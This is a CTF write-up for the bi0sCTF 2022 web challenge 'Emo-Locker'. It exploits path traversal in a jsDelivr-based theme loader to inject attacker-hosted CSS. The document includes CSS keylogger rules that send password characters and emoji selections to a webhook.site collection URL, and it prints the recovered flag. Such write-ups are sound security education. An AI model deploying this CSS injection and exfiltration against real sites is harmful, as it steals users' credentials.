# bi0sCTF 2022

URL: https://ctf.bi0s.in/

Team: Kalmarunionen

Place: 7 (of 294)

## Emo-Locker

> All new emoji-based authentication service. See if you can get the admin's emojis. 🥷

In `index.js` we see this change theme logic:

```jsx
class Main extends React.Component {
    constructor(props) {
        super(props);

        let link_obj = document.createElement("link");
        link_obj.rel = "stylesheet"
        this.state = {
            link_obj: link_obj
        };

        this.switchTheme = this.switchTheme.bind(this);
    }

    componentDidMount() {
        document.head.appendChild(this.state.link_obj);
        window.addEventListener("hashchange", this.switchTheme, false);
    }

    switchTheme() {
        this.setState((prevState) => {
            let href = `https://cdn.jsdelivr.net/npm/darkmode-css@1.0.1/${window.location.hash.replace("#", '')}-mode.css`;
            prevState.link_obj.href = href;
            return {}
        });
    }

	// ...
}
```

So we can load `http://web.chall.bi0s.in:10101/#dark` to get dark-mode.

But jsDelivr has a great feature for bypassing CSP/etc, which is the _CDN-for-any-GitHub_-feature:

> jsDelivr CDN service’s base URL is `https://cdn.jsdelivr.net/gh/{username}/{repo}/`, where you replace `{username}` with the GitHub username and `{repo}` with the repository name for the project.

So if I create repo 'hax' under my GitHub profile and add a file called 'a-mode.css', it can be loaded using: `http://web.chall.bi0s.in:10101/#../../gh/NicolaiSoeborg/hax/a`

I.e. `https://cdn.jsdelivr.net/npm/darkmode-css@1.0.1/../../gh/NicolaiSoeborg/hax/a-mode.css`

### CSS-based Keylogger

Normally one would do:

```css
input[type="password"][value$="bi0sctf{a"] {
  background-image: url("http://webhook.site/callback?data=a");
}
input[type="password"][value$="bi0sctf{b"] {
  background-image: url("http://webhook.site/callback?data=b");
}
input[type="password"][value$="bi0sctf{c"] {
  background-image: url("http://webhook.site/callback?data=c");
}
/* ... */
```

But in this case the password input field is replaced with `*` and the secret emoji sequence is stored in a local state.
When an emoji is selected, the corresponding HTML element is cleared so the emoji can only be picked once. We can use the CSS selector `:empty` to find these elements, i.e. `span[role="img"][aria-label="1"]` is the first emoji and `span[role="img"][aria-label="1"]:empty` is the selector for when the emoji is picked.

Using this we change the `a-mode.css` file to:

```css
span[role="img"][aria-label="1"]:empty { background-image: url("https://webhook.site/cb…61?data=1"); }
span[role="img"][aria-label="2"]:empty { background-image: url("https://webhook.site/cb…61?data=2"); }
span[role="img"][aria-label="3"]:empty { background-image: url("https://webhook.site/cb…61?data=3"); }
span[role="img"][aria-label="4"]:empty { background-image: url("https://webhook.site/cb…61?data=4"); }
span[role="img"][aria-label="5"]:empty { background-image: url("https://webhook.site/cb…61?data=5"); }
span[role="img"][aria-label="6"]:empty { background-image: url("https://webhook.site/cb…61?data=6"); }
span[role="img"][aria-label="7"]:empty { background-image: url("https://webhook.site/cb…61?data=7"); }
/* ... */
```

And watch the requests coming in whenever an emoji is selected.
The secret sequence is "51,32,73,34,85,126,17,158,79,50" (😔 🫢 😕🤫😧🙊🤩💬😯😌) which we can use to login ourself and get the flag: `bi0sctf{a34522e2009192570c840f931e4c3c0a}`
